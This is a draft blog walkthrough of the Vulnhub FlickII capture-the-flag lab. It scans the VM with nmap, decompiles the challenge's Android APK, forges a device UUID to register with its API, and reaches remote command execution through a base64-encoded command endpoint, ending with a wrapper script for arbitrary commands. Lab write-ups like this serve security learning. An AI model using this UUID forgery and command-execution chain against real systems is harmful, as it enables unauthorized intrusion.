Title:Vulnhub - FlickII
Date: 03-01-2016 16:55
Status: draft
category:security
tags:security, vulnhub, challenge
meta:security, vulnhub, challenge, FlickII

<img class="align-left"
src="/media/todo" alt="FlickII" width="162">

TODO

<!-- PELICAN_END_SUMMARY -->

Many thanks to TurboSmouem

## Host discovery

Connecting to host-only network:

    sudo ip addr add 192.168.56.1/24 dev vboxnet

Scanning the network to find the virtual machine IP address:

    [maggick@rootine flick-check-dist]$ nmap -sn 192.168.56.1/24

    Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-30 18:41 CET
    Nmap scan report for 192.168.56.1
    Host is up (0.00061s latency).
    Nmap scan report for 192.168.56.101
    Host is up (0.00097s latency).
    Nmap done: 256 IP addresses (2 hosts up) scanned in 2.45 seconds

Scanning the virtual machine to find open ports:

    [maggick@rootine flick-check-dist]$ nmap -p0-65535 192.168.56.101 -T4

    Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-30 18:50 CET
    Nmap scan report for 192.168.56.101
    Host is up (0.00088s latency).
    Not shown: 65534 filtered ports
    PORT    STATE  SERVICE
    80/tcp  closed http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 123.28 seconds

## APK analysis

We got an apk. If we unzip it we got lots of xml files and a dex file.

    ls ~/Downloads/flickII/flick-check-dist
    AndroidManifest.xml  classes.dex  META-INF  README  res  resources.arsc

There is a lot of tool in order to decompile and APK and get class files or jar
files like [dare](http://siis.cse.psu.edu/dare/),
[dex2jar](http://sourceforge.net/projects/dex2jar/) and more ([here is an article
about android decompiler comparaison](http://shgck.io/docs/android/apk_decomp/).

I tried to use dare to convert dex file to Java bytecode but there was an issue
between my 64 bits Arch Linux system and the 32 bits executable. I didn't dig
this issue and just go for dex2jar:

    sh d2j-dex2jar.sh flick-check-dist.apk

From there I use [cfr](http://www.benf.org/other/cfr/) to decompile the jar file
to Java files and human readable code.

    java -jar cfr_0_110.jar flickII/flick-check-dist-dex2jar.jar --outputdir flickII/flick-check-dist-cfr-java/

We got the decompiled code. The interesting part of the application is the
com/flick/flickeck folder:

    ::text
    ├── com
    │   ├── flick
    │   │   └── flickcheck
    │   │       ├── BuildConfig.java
    │   │       ├── CallApi.java
    │   │       ├── CommandActivity.java
    │   │       ├── DoRegisterActivity.java
    │   │       ├── MainActivity.java
    │   │       ├── PubKeyManager.java
    │   │       ├── ReadApiServerActivity.java
    │   │       ├── RegisterActivity.java
    │   │       └── R.java

We take a look at each file in this directory in order to understand the
application goal and how it works.

### API token and DoRegisterActivity.java

The file DoRegisterActivity.java show us how to register a new device. By
testing the URL presented in the file we got:

    ::text
    [maggick@rootine ~]$ curl   https://192.168.56.101/register/new --insecure
    {"error":"This method is not allowed for the requested resource."}

We lack an ID to "authenticate" ourself. The line 70 to 75 show us how to get
this ID:

    ::java
    Object object2 = (TelephonyManager)this.getBaseContext().getSystemService("phone");
    object = "" + object2.getDeviceId();
    object2 = "" + object2.getSimSerialNumber();
    object = new UUID(("" + Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id")).hashCode(), (long)object.hashCode() << 32 | (long)object2.hashCode()).toString();
    object2 = this.getSharedPreferences(this.getString(2131099666), 0).getString("api_server", null);
    new CallAPI().execute((Object[])new String[]{"https://" + (String)object2 + "/register/new", object});

Let us wrote some Java to generate this ID for us:

Our `object` and `object2` variables are named generically by the debugger. We
can see in the code above that `object` is a string containing the device ID and
that `object2` is a string containing the serial number of the Sim card.
Moreover the line where the code generate the new UUID (see the
[javadoc](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/UUID.html) for
more information about this object) use an other variable accessible on the
phone: the android ID.

With all this information we come easily with the following code:


    ::java
    import java.util.UUID;

    public class HelloWorld {

      public static void main(String[] args) {
        String deviceId = "12345";
        String SimSerialNumber = "67890";
        String androidId= "34567";

        String code="";

        code = new UUID(androidId.hashCode(), deviceId.hashCode() << 32 | SimSerialNumber.hashCode()).toString();
        System.out.println(code);
        }
    }

We compile this code with `javac` and execute it with `java` (yeah I have named
it HelloWorld):

    ::text
    [maggick@rootine ~]$ java HelloWorld
    00000000-02e7-1fb5-0000-000003daceff

We can now try again the URL with this UUID sent in a post parameter:

    ::text
    [maggick@rootine ~]$ curl --data 'uuid=00000000-02e7-1fb5-0000-000003daceff' https://192.168.56.101/register/new --insecure
    {"registered":"ok","message":"The requested UUID is now registered.","token":"t6nsb2SrfYKqsp8JIdbEscwfwA6JEeUh"}

Great we are registered, what's next?

### Command execution and CommandActivity.java

Line 111 in the file `CommandActivity.java` we see the doCmd method that seems
to execute commands on the server via HTTP:

    ::java
    public void doCmd(View object) {
        Toast.makeText((Context)this, (CharSequence)("Running command: " + object.getTag().toString()), (int)0).show();
        object = Base64.encodeToString((byte[])object.getTag().toString().getBytes(), (int)0);
        Object object2 = (TelephonyManager)this.getBaseContext().getSystemService("phone");
        String string2 = "" + object2.getDeviceId();
        object2 = "" + object2.getSimSerialNumber();
        string2 = new UUID(("" + Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id")).hashCode(), (long)string2.hashCode() << 32 | (long)object2.hashCode()).toString();
        Object object3 = this.getSharedPreferences(this.getString(2131099666), 0);
        object2 = object3.getString("api_server", null);
        object3 = object3.getString("api_auth_token", null);
        new CallAPI().execute((Object[])new String[]{"https://" + (String)object2 + "/do/cmd/" + (String)object, string2, object3});
    }

The View object in parameter is the command to execute. The command is just
base64 encoded before sending it to the server as `object` in the url, the
string2` parameter is the UUID we generate a few lines ago sent in the HTTP
header as 'X-UUID'
parameter, the `object3` parameter is the token to authenticate to the API given
with the curl command just before also sent in the header as 'X-Token' (you may
need to look at the CallAPI method and more particulary at line 182 and 183)

    ::text
    [maggick@rootine ~]$ curl   https://192.168.56.101/do/cmd/$(echo -ne id | base64) --header "X-UUID: 00000000-02e7-1fb5-0000-000003daceff" --header "X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18" --insecure
    {"status":"ok","command":"id","output":"uid=998(nginx) gid=997(nginx) groups=997(nginx)\n"}

We can execute command on the server, let us wrote a simple bash script to
simplify the next steps (we put an echo at the end to have a nice output):


    ::bash
    #!/bin/bash

    curl   https://192.168.56.101/do/cmd/$(echo -ne $1 | base64) --header "X-UUID: 00000000-02e7-1fb5-0000-000003daceff" --header "X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18" --insecure
    echo ''
